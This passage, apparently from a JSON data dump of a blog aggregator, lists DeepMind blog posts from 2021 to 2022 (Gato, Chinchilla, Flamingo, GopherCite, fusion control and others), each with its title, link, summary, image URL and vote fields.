"aggregate_votes_count": 1, "comments_count": 0, "score": 11538.8787411, "slug": "open-sourcing-mujoco-200", "topics": []}}, {"model": "app.post", "pk": 201, "fields": {"title": "From LEGO competitions to DeepMind's robotics lab", "link": "https://www.deepmind.com/blog/from-lego-competitions-to-deepminds-robotics-lab", "source": 1, "normalized_link": "www.deepmind.com/blog/from-lego-competitions-to-deepminds-robotics-lab", "summary": "If you want to be at DeepMind, go for it. Apply, interview, and just try. You might not get it the first time but that doesn\u2019t mean you can\u2019t try again. I never thought DeepMind would accept me, and when they did, I thought it was a mistake. Everyone doubts themselves \u2013 I\u2019ve never felt like the smartest person in the room. I\u2019ve often felt the opposite. But I\u2019ve learned that, despite those feelings, I do belong and I do deserve to work at a place like this. And that journey, for me, started with just trying.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62863b2de650d13aae1b5176_Akhil_Raju__Blog__16x9.jpg", "profile": 8, "updated_on": "2022-05-19T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11531.1987411, "slug": "from-lego-competitions-to-deepminds-robotics-lab-201", "topics": []}}, {"model": "app.post", "pk": 202, "fields": {"title": "Emergent Bartering Behaviour in Multi-Agent Reinforcement Learning", "link": "https://www.deepmind.com/blog/emergent-bartering-behaviour-in-multi-agent-reinforcement-learning", "source": 1, "normalized_link": "www.deepmind.com/blog/emergent-bartering-behaviour-in-multi-agent-reinforcement-learning", "summary": "In our recent paper, we explore how populations of deep reinforcement learning (deep RL) agents can learn microeconomic behaviours, such as production, consumption, and trading of goods. We find that artificial agents learn to make economically rational decisions about production, consumption, and prices, and react appropriately to supply and demand changes.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-05-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11525.4387411, "slug": "emergent-bartering-behaviour-in-multi-agent-reinforcement-learning-202", "topics": []}}, {"model": "app.post", "pk": 203, "fields": {"title": "A Generalist Agent", "link": "https://www.deepmind.com/blog/a-generalist-agent", "source": 1, "normalized_link": "www.deepmind.com/blog/a-generalist-agent", "summary": "Inspired by progress in large-scale language modelling, we apply a similar approach towards building a single generalist agent beyond the realm of text outputs. The agent, which we refer to as Gato, works as a multi-modal, multi-task, multi-embodiment generalist policy. The same network with the same weights can play Atari, caption images, chat, stack blocks with a real robot arm and much more, deciding based on its context whether to output text, joint torques, button presses, or other tokens.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-05-12T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11517.7587411, "slug": "a-generalist-agent-203", "topics": []}}, {"model": "app.post", "pk": 204, "fields": {"title": "Active offline policy selection", "link": "https://www.deepmind.com/blog/active-offline-policy-selection", "source": 1, "normalized_link": "www.deepmind.com/blog/active-offline-policy-selection", "summary": "To make RL more applicable to real-world applications like robotics, we propose using an intelligent evaluation procedure to select the policy for deployment, called active offline policy selection (A-OPS). In A-OPS, we make use of the prerecorded dataset and allow limited interactions with the real environment to boost the selection quality.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62c2cd30ac8e869fd9b6b2af_icon--paper.svg", "profile": 8, "updated_on": "2022-05-06T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11506.2387411, "slug": "active-offline-policy-selection-204", "topics": []}}, {"model": "app.post", "pk": 205, "fields": {"title": "Tackling multiple tasks with a single visual language model", "link": "https://www.deepmind.com/blog/tackling-multiple-tasks-with-a-single-visual-language-model", "source": 1, "normalized_link": "www.deepmind.com/blog/tackling-multiple-tasks-with-a-single-visual-language-model", "summary": "We introduce Flamingo, a single visual language model (VLM) that sets a new state of the art in few-shot learning on a wide range of open-ended multimodal tasks.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62698380492f73d063be7edb_falimgo.jpeg", "profile": 8, "updated_on": "2022-04-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11490.8787411, "slug": "tackling-multiple-tasks-with-a-single-visual-language-model-205", "topics": []}}, {"model": "app.post", "pk": 206, "fields": {"title": "When a passion for bass and brass help build better tools", "link": "https://www.deepmind.com/blog/when-a-passion-for-bass-and-brass-help-build-better-tools", "source": 1, "normalized_link": "www.deepmind.com/blog/when-a-passion-for-bass-and-brass-help-build-better-tools", "summary": "We caught up with Kevin Millikin, a software engineer on the DevTools team. He\u2019s in Salt Lake City this week to present at PyCon US, the largest annual gathering for those using and developing the open-source Python programming language.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/626abcd44249b2b5920371e1_kevin-millikin-05.jpg", "profile": 8, "updated_on": "2022-04-28T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11490.8787411, "slug": "when-a-passion-for-bass-and-brass-help-build-better-tools-206", "topics": []}}, {"model": "app.post", "pk": 207, "fields": {"title": "DeepMind\u2019s latest research at ICLR 2022", "link": "https://www.deepmind.com/blog/deepminds-latest-research-at-iclr-2022", "source": 1, "normalized_link": "www.deepmind.com/blog/deepminds-latest-research-at-iclr-2022", "summary": "Beyond supporting the event as sponsors and regular workshop organisers, our research teams are presenting 29 papers, including 10 collaborations this year. Here\u2019s a brief glimpse into our upcoming oral, spotlight, and poster presentations.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-04-25T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11485.1187411, "slug": "deepminds-latest-research-at-iclr-2022-207", "topics": []}}, {"model": "app.post", "pk": 208, "fields": {"title": "An empirical analysis of compute-optimal large language model training", "link": "https://www.deepmind.com/blog/an-empirical-analysis-of-compute-optimal-large-language-model-training", "source": 1, "normalized_link": "www.deepmind.com/blog/an-empirical-analysis-of-compute-optimal-large-language-model-training", "summary": "We ask the question: \u201cWhat is the optimal model size and number of training tokens for a given compute budget?\u201d To answer this question, we train models of various sizes and with various numbers of tokens, and estimate this trade-off empirically. Our main finding is that the current large language models are far too large for their compute budget and are not being trained on enough data.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62557f43672f48833d2088c1_chinchilla.performance.image.png", "profile": 8, "updated_on": "2022-04-12T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11460.1587411, "slug": "an-empirical-analysis-of-compute-optimal-large-language-model-training-208", "topics": []}}, {"model": "app.post", "pk": 209, "fields": {"title": "GopherCite: Teaching language models to support answers with verified quotes", "link": "https://www.deepmind.com/blog/gophercite-teaching-language-models-to-support-answers-with-verified-quotes", "source": 1, "normalized_link": "www.deepmind.com/blog/gophercite-teaching-language-models-to-support-answers-with-verified-quotes", "summary": "Language models like Gopher can \u201challucinate\u201d facts that appear plausible but are actually fake. Those who are familiar with this problem know to do their own fact-checking, rather than trusting what language models say. Those who are not, may end up believing something that isn\u2019t true. This paper describes GopherCite, a model which aims to address the problem of language model hallucination. GopherCite attempts to back up all of its factual claims with evidence from the web.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-03-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11408.3187411, "slug": "gophercite-teaching-language-models-to-support-answers-with-verified-quotes-209", "topics": []}}, {"model": "app.post", "pk": 210, "fields": {"title": "Predicting the past with Ithaca", "link": "https://www.deepmind.com/blog/predicting-the-past-with-ithaca", "source": 1, "normalized_link": "www.deepmind.com/blog/predicting-the-past-with-ithaca", "summary": "The birth of human writing marked the dawn of History and is crucial to our understanding of past civilisations and the world we live in today. For example, more than 2,500 years ago, the Greeks began writing on stone, pottery, and metal to document everything from leases and laws to calendars and oracles, giving a detailed insight into the Mediterranean region. Unfortunately, it\u2019s an incomplete record. Many of the surviving inscriptions have been damaged over the centuries or moved from their original location. In addition, modern dating techniques, such as radiocarbon dating, cannot be used on these materials, making inscriptions difficult and time-consuming to interpret.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6231e42c37dcdc284d8142f0_ancient_texts.jpg", "profile": 8, "updated_on": "2022-03-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11394.8787411, "slug": "predicting-the-past-with-ithaca-210", "topics": []}}, {"model": "app.post", "pk": 211, "fields": {"title": "Learning Robust Real-Time Cultural Transmission without Human Data", "link": "https://www.deepmind.com/blog/learning-robust-real-time-cultural-transmission-without-human-data", "source": 1, "normalized_link": "www.deepmind.com/blog/learning-robust-real-time-cultural-transmission-without-human-data", "summary": "In this work, we use deep reinforcement learning to generate artificial agents capable of test-time cultural transmission. Once trained, our agents can infer and recall navigational knowledge demonstrated by experts. This knowledge transfer happens in real time and generalises across a vast space of previously unseen tasks.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62c2cd30ac8e869fd9b6b2af_icon--paper.svg", "profile": 8, "updated_on": "2022-03-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11383.3587411, "slug": "learning-robust-real-time-cultural-transmission-without-human-data-211", "topics": []}}, {"model": "app.post", "pk": 212, "fields": {"title": "Probing Image-Language Transformers for Verb Understanding", "link": "https://www.deepmind.com/blog/probing-image-language-transformers-for-verb-understanding", "source": 1, "normalized_link": "www.deepmind.com/blog/probing-image-language-transformers-for-verb-understanding", "summary": "Multimodal Image-Language transformers have achieved impressive results on a variety of tasks that rely on fine-tuning (e.g., visual question answering and image retrieval). We are interested in shedding light on the quality of their pretrained representations--in particular, if these models can distinguish verbs or they only use the nouns in a given sentence. To do so, we collect a dataset of image-sentence pairs consisting of 447 verbs that are either visual or commonly found in the pretraining data (i.e., the Conceptual Captions dataset). We use this dataset to evaluate the pretrained models in a zero-shot way.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-02-23T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11367.9987411, "slug": "probing-image-language-transformers-for-verb-understanding-212", "topics": []}}, {"model": "app.post", "pk": 213, "fields": {"title": "Accelerating fusion science through learned plasma control", "link": "https://www.deepmind.com/blog/accelerating-fusion-science-through-learned-plasma-control", "source": 1, "normalized_link": "www.deepmind.com/blog/accelerating-fusion-science-through-learned-plasma-control", "summary": "Successfully controlling the nuclear fusion plasma in a tokamak with deep reinforcement learning", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6221542cc35fbd6c1e95bc15_Fusion_16-9.jpg", "profile": 8, "updated_on": "2022-02-16T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11354.5587411, "slug": "accelerating-fusion-science-through-learned-plasma-control-213", "topics": []}}, {"model": "app.post", "pk": 214, "fields": {"title": "MuZero\u2019s first step from research into the real world", "link": "https://www.deepmind.com/blog/muzeros-first-step-from-research-into-the-real-world", "source": 1, "normalized_link": "www.deepmind.com/blog/muzeros-first-step-from-research-into-the-real-world", "summary": "Collaborating with YouTube to optimise video compression in the open source VP9 codec.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6221e65a2dc35668312cc876_MuZero_YouTube_01.jpg", "profile": 8, "updated_on": "2022-02-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11344.9587411, "slug": "muzeros-first-step-from-research-into-the-real-world-214", "topics": []}}, {"model": "app.post", "pk": 215, "fields": {"title": "Red Teaming Language Models with Language Models", "link": "https://www.deepmind.com/blog/red-teaming-language-models-with-language-models", "source": 1, "normalized_link": "www.deepmind.com/blog/red-teaming-language-models-with-language-models", "summary": "In our recent paper, we show that it is possible to automatically find inputs that elicit harmful text from language models by generating inputs using language models themselves. Our approach provides one tool for finding harmful model behaviours before users are impacted, though we emphasize that it should be viewed as one component alongside many other techniques that will be needed to find harms and mitigate them once found.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-02-07T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11337.2787411, "slug": "red-teaming-language-models-with-language-models-215", "topics": []}}, {"model": "app.post", "pk": 216, "fields": {"title": "DeepMind: The Podcast returns for Season 2", "link": "https://www.deepmind.com/blog/deepmind-the-podcast-returns-for-season-2", "source": 1, "normalized_link": "www.deepmind.com/blog/deepmind-the-podcast-returns-for-season-2", "summary": "We believe artificial intelligence (AI) is one of the most significant technologies of our age and we want to help people understand its potential and how it\u2019s being created.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6221e7e9a4293bbe1edbbf25_The%20Podcast.jpg", "profile": 8, "updated_on": "2022-01-25T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11312.3187411, "slug": "deepmind-the-podcast-returns-for-season-2-216", "topics": []}}, {"model": "app.post", "pk": 217, "fields": {"title": "Spurious normativity enhances learning of compliance and enforcement behavior in artificial agents", "link": "https://www.deepmind.com/blog/spurious-normativity-enhances-learning-of-compliance-and-enforcement-behavior-in-artificial-agents", "source": 1, "normalized_link": "www.deepmind.com/blog/spurious-normativity-enhances-learning-of-compliance-and-enforcement-behavior-in-artificial-agents", "summary": "In our recent paper we explore how multi-agent deep reinforcement learning can serve as a model of complex social interactions, like the formation of social norms. This new class of models could provide a path to create richer, more detailed simulations of the world.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2022-01-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11298.8787411, "slug": "spurious-normativity-enhances-learning-of-compliance-and-enforcement-behavior-in-artificial-agents-217", "topics": []}}, {"model": "app.post", "pk": 218, "fields": {"title": "Simulating matter on the quantum scale with AI", "link": "https://www.deepmind.com/blog/simulating-matter-on-the-quantum-scale-with-ai", "source": 1, "normalized_link": "www.deepmind.com/blog/simulating-matter-on-the-quantum-scale-with-ai", "summary": "Solving some of the major challenges of the 21st Century, such as producing clean electricity or developing high temperature superconductors, will require us to design new materials with specific properties. To do this on a computer requires the simulation of electrons, the subatomic particles that govern how atoms bond to form molecules and are also responsible for the flow of electricity in solids.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6221e82a6274a91d6b24c3a6_Simulating%20Matter.jpg", "profile": 8, "updated_on": "2021-12-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11222.0787411, "slug": "simulating-matter-on-the-quantum-scale-with-ai-218", "topics": []}}, {"model": "app.post", "pk": 219, "fields": {"title": "Language modelling at scale: Gopher, ethical considerations, and retrieval", "link": "https://www.deepmind.com/blog/language-modelling-at-scale-gopher-ethical-considerations-and-retrieval", "source": 1, "normalized_link": "www.deepmind.com/blog/language-modelling-at-scale-gopher-ethical-considerations-and-retrieval", "summary": "Language, and its role in demonstrating and facilitating comprehension - or intelligence - is a fundamental part of being human. It gives people the ability to communicate thoughts and concepts, express ideas, create memories, and build mutual understanding. These are foundational parts of social intelligence. It\u2019s why our teams at DeepMind study aspects of language processing and communication, both in artificial agents and in humans.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/622216be01a2ee7d876bba4f_LLM.jpg", "profile": 8, "updated_on": "2021-12-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11220.1587411, "slug": "language-modelling-at-scale-gopher-ethical-considerations-and-retrieval-219", "topics": []}}, {"model": "app.post", "pk": 220, "fields": {"title": "Improving language models by retrieving from trillions of tokens", "link": "https://www.deepmind.com/blog/improving-language-models-by-retrieving-from-trillions-of-tokens", "source": 1, "normalized_link": "www.deepmind.com/blog/improving-language-models-by-retrieving-from-trillions-of-tokens", "summary": "We explore an alternate path for improving language models: we augment transformers with retrieval over a database of text passages including web pages, books, news and code. We call our method RETRO, for \u201cRetrieval Enhanced TRansfOrmers\u201d.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-12-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11220.1587411, "slug": "improving-language-models-by-retrieving-from-trillions-of-tokens-220", "topics": []}}, {"model": "app.post", "pk": 221, "fields": {"title": "Creating Interactive Agents with Imitation Learning", "link": "https://www.deepmind.com/blog/creating-interactive-agents-with-imitation-learning", "source": 1, "normalized_link": "www.deepmind.com/blog/creating-interactive-agents-with-imitation-learning", "summary": "We show that imitation learning of human-human interactions in a simulated world, in conjunction with self-supervised learning, is sufficient to produce a multimodal interactive agent, which we call MIA, that successfully interacts with non-adversarial humans 75% of the time. We further identify architectural and algorithmic techniques that improve performance, such as hierarchical action selection.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-12-08T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11220.1587411, "slug": "creating-interactive-agents-with-imitation-learning-221", "topics": []}}, {"model": "app.post", "pk": 222, "fields": {"title": "Exploring the beauty of pure mathematics in novel ways", "link": "https://www.deepmind.com/blog/exploring-the-beauty-of-pure-mathematics-in-novel-ways", "source": 1, "normalized_link": "www.deepmind.com/blog/exploring-the-beauty-of-pure-mathematics-in-novel-ways", "summary": "More than a century ago, Srinivasa Ramanujan shocked the mathematical world with his extraordinary ability to see remarkable patterns in numbers that no one else could see. The self-taught mathematician from India described his insights as deeply intuitive and spiritual, and patterns often came to him in vivid dreams.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6221e89e215215575bb40563_Maths%20and%20AI.jpg", "profile": 8, "updated_on": "2021-12-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11206.7187411, "slug": "exploring-the-beauty-of-pure-mathematics-in-novel-ways-222", "topics": []}}, {"model": "app.post", "pk": 223, "fields": {"title": "On the Expressivity of Markov Reward", "link": "https://www.deepmind.com/blog/on-the-expressivity-of-markov-reward", "source": 1, "normalized_link": "www.deepmind.com/blog/on-the-expressivity-of-markov-reward", "summary": "Our main results prove that while reward can express many tasks, there exist instances of each task type that no Markov reward function can capture. We then provide a set of polynomial-time algorithms that construct a reward function which allows an agent to optimize tasks of each of these three types, and correctly determine when no such reward function exists.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-12-01T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11206.7187411, "slug": "on-the-expressivity-of-markov-reward-223", "topics": []}}, {"model": "app.post", "pk": 224, "fields": {"title": "Unsupervised deep learning identifies semantic disentanglement in single inferotemporal face patch neurons", "link": "https://www.deepmind.com/blog/unsupervised-deep-learning-identifies-semantic-disentanglement-in-single-inferotemporal-face-patch-neurons", "source": 1, "normalized_link": "www.deepmind.com/blog/unsupervised-deep-learning-identifies-semantic-disentanglement-in-single-inferotemporal-face-patch-neurons", "summary": "Our brain has an amazing ability to process visual information. We can take one glance at a complex scene, and within milliseconds be able to parse it into objects and their attributes, like colour or size, and use this information to describe the scene in simple language. Underlying this seemingly effortless ability is a complex computation performed by our visual cortex, which involves taking millions of neural impulses transmitted from the retina and transforming them into a more meaningful form that can be mapped to the simple language description. In order to fully understand how this process works in the brain, we need to figure out both how the semantically meaningful information is represented in the firing of neurons at the end of the visual processing hierarchy, and how such a representation may be learnt from largely untaught experience.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-11-09T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11164.4787411, "slug": "unsupervised-deep-learning-identifies-semantic-disentanglement-in-single-inferotemporal-face-patch-neurons-224", "topics": []}}, {"model": "app.post", "pk": 225, "fields": {"title": "Real-world challenges for AGI", "link": "https://www.deepmind.com/blog/real-world-challenges-for-agi", "source": 1, "normalized_link": "www.deepmind.com/blog/real-world-challenges-for-agi", "summary": "When people picture a world with artificial general intelligence (AGI), robots are more likely to come to mind than enabling solutions to society\u2019s most intractable problems. But I believe the latter is much closer to the truth. AI is already enabling huge leaps in tackling fundamental challenges: from solving protein folding to predicting accurate weather patterns, scientists are increasingly using AI to deduce the rules and principles that underpin highly complex real-world domains - ones they might never have discovered unaided. Advances in AGI research will supercharge society\u2019s ability to tackle and manage climate change - not least because of its urgency but also due to its complex and multifaceted nature.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/62331eeed058753ca9e0e3b9_real-world-header.jpg", "profile": 8, "updated_on": "2021-11-02T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11151.0387411, "slug": "real-world-challenges-for-agi-225", "topics": []}}, {"model": "app.post", "pk": 226, "fields": {"title": "Opening up a physics simulator for robotics", "link": "https://www.deepmind.com/blog/opening-up-a-physics-simulator-for-robotics", "source": 1, "normalized_link": "www.deepmind.com/blog/opening-up-a-physics-simulator-for-robotics", "summary": "When you walk, your feet make contact with the ground. When you write, your fingers make contact with the pen. Physical contacts are what makes interaction with the world possible. Yet, for such a common occurrence, contact is a surprisingly complex phenomenon. Taking place at microscopic scales at the interface of two bodies, contacts can be soft or stiff, bouncy or spongy, slippery or sticky. It\u2019s no wonder our fingertips have four different types of touch-sensors. This subtle complexity makes simulating physical contact \u2014 a vital component of robotics research \u2014 a tricky task.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-10-18T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11122.2387411, "slug": "opening-up-a-physics-simulator-for-robotics-226", "topics": []}}, {"model": "app.post", "pk": 227, "fields": {"title": "Stacking our way to more general robots", "link": "https://www.deepmind.com/blog/stacking-our-way-to-more-general-robots", "source": 1, "normalized_link": "www.deepmind.com/blog/stacking-our-way-to-more-general-robots", "summary": "Picking up a stick and balancing it atop a log or stacking a pebble on a stone may seem like simple \u2014 and quite similar \u2014 actions for a person. However, most robots struggle with handling more than one such task at a time. Manipulating a stick requires a different set of behaviours than stacking stones, never mind piling various dishes on top of one another or assembling furniture. Before we can teach robots how to perform these kinds of tasks, they first need to learn how to interact with a far greater range of objects. As part of DeepMind\u2019s mission and as a step toward making more generalisable and useful robots, we\u2019re exploring how to enable robots to better understand the interactions of objects with diverse geometries.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6227e444c09fa8d9cf213588_Pick_and_Place_10.0030.jpg", "profile": 8, "updated_on": "2021-10-11T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11108.7987411, "slug": "stacking-our-way-to-more-general-robots-227", "topics": []}}, {"model": "app.post", "pk": 228, "fields": {"title": "Predicting gene expression with AI", "link": "https://www.deepmind.com/blog/predicting-gene-expression-with-ai", "source": 1, "normalized_link": "www.deepmind.com/blog/predicting-gene-expression-with-ai", "summary": "When the Human Genome Project succeeded in mapping the DNA sequence of the human genome, the international research community were excited by the opportunity to better understand the genetic instructions that influence human health and development. DNA carries the genetic information that determines everything from eye colour to susceptibility to certain diseases and disorders. The roughly 20,000 sections of DNA in the human body known as genes contain instructions about the amino acid sequence of proteins, which perform numerous essential functions in our cells. Yet these genes make up less than 2% of the genome. The remaining base pairs \u2014 which account for 98% of the 3 billion \u201cletters\u201d in the genome \u2014 are called \u201cnon-coding\u201d and contain less well-understood instructions about when and where genes should be produced or expressed in the human body. At DeepMind, we believe that AI can unlock a deeper understanding of such complex domains, accelerating scientific progress and offering potential benefits to human health.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6227e3af8f313f6efb044b99_Enformer.jpg", "profile": 8, "updated_on": "2021-10-04T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11095.3587411, "slug": "predicting-gene-expression-with-ai-228", "topics": []}}, {"model": "app.post", "pk": 229, "fields": {"title": "Nowcasting the next hour of rain", "link": "https://www.deepmind.com/blog/nowcasting-the-next-hour-of-rain", "source": 1, "normalized_link": "www.deepmind.com/blog/nowcasting-the-next-hour-of-rain", "summary": "Our lives are dependent on the weather. At any moment in the UK, according to one study, one third of the country has talked about the weather in the past hour, reflecting the importance of weather in daily life. Amongst weather phenomena, rain is especially important because of its influence on our everyday decisions. Should I take an umbrella? How should we route vehicles experiencing heavy rain? What safety measures do we take for outdoor events? Will there be a flood? Our latest research and state-of-the-art model advances the science of Precipitation Nowcasting, which is the prediction of rain (and other precipitation phenomena) within the next 1-2 hours. In a paper written in collaboration with the Met Office and published in Nature, we directly tackle this important grand challenge in weather prediction. This collaboration between environmental science and AI focuses on value for decision-makers, opening up new avenues for the nowcasting of rain, and points to the opportunities for AI in supporting our response to the challenges of decision-making in an environment under constant change.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6227e2cc28dc8e194473d9ff_Nowcasting.jpg", "profile": 8, "updated_on": "2021-09-29T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11085.7587411, "slug": "nowcasting-the-next-hour-of-rain-229", "topics": []}}, {"model": "app.post", "pk": 230, "fields": {"title": "Is Curiosity All You Need? On the Utility of Emergent Behaviours from Curious Exploration", "link": "https://www.deepmind.com/blog/is-curiosity-all-you-need-on-the-utility-of-emergent-behaviours-from-curious-exploration", "source": 1, "normalized_link": "www.deepmind.com/blog/is-curiosity-all-you-need-on-the-utility-of-emergent-behaviours-from-curious-exploration", "summary": "We argue that merely using curiosity for fast environment exploration or as a bonus reward for a specific task does not harness the full potential of this technique and misses useful skills. Instead, we propose to shift the focus towards retaining the behaviours which emerge during curiosity-based learning. We posit that these self-discovered behaviours serve as valuable skills in an agent\u2019s repertoire to solve related tasks.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-09-17T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11062.7187411, "slug": "is-curiosity-all-you-need-on-the-utility-of-emergent-behaviours-from-curious-exploration-230", "topics": []}}, {"model": "app.post", "pk": 231, "fields": {"title": "Challenges in Detoxifying Language Models", "link": "https://www.deepmind.com/blog/challenges-in-detoxifying-language-models", "source": 1, "normalized_link": "www.deepmind.com/blog/challenges-in-detoxifying-language-models", "summary": "In our paper, we focus on LMs and their propensity to generate toxic language. We study the effectiveness of different methods to mitigate LM toxicity, and their side-effects, and we investigate the reliability and limits of classifier-based automatic toxicity evaluation.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621d30e84caf0be3291dbf1c/621d54077adc34060ed9b0dc_icon__24x__misc__call-to-action.svg", "profile": 8, "updated_on": "2021-09-15T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11058.8787411, "slug": "challenges-in-detoxifying-language-models-231", "topics": []}}, {"model": "app.post", "pk": 232, "fields": {"title": "Building architectures that can handle the world\u2019s data", "link": "https://www.deepmind.com/blog/building-architectures-that-can-handle-the-worlds-data", "source": 1, "normalized_link": "www.deepmind.com/blog/building-architectures-that-can-handle-the-worlds-data", "summary": "Most architectures used by AI systems today are specialists. A 2D residual network may be a good choice for processing images, but at best it\u2019s a loose fit for other kinds of data \u2014 such as the Lidar signals used in self-driving cars or the torques used in robotics. What\u2019s more, standard architectures are often designed with only one task in mind, often leading engineers to bend over backwards to reshape, distort, or otherwise modify their inputs and outputs in hopes that a standard architecture can learn to handle their problem correctly. Dealing with more than one kind of data, like the sounds and images that make up videos, is even more complicated and usually involves complex, hand-tuned systems built from many different parts, even for simple tasks. As part of DeepMind's mission of solving intelligence to advance science and humanity, we want to build systems that can solve problems that use many types of inputs and outputs, so we began to explore a more general and versatile architecture that can handle all types of data.", "content": "", "cover_photo_url": "https://assets-global.website-files.com/621e749a546b7592125f38ed/6227db3ca8b6711860971026_Perceiver%20IO.jpg", "profile": 8, "updated_on": "2021-08-03T00:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10976.3187411, "slug": "building-architectures-that-can-handle-the-worlds-data-232", "topics": 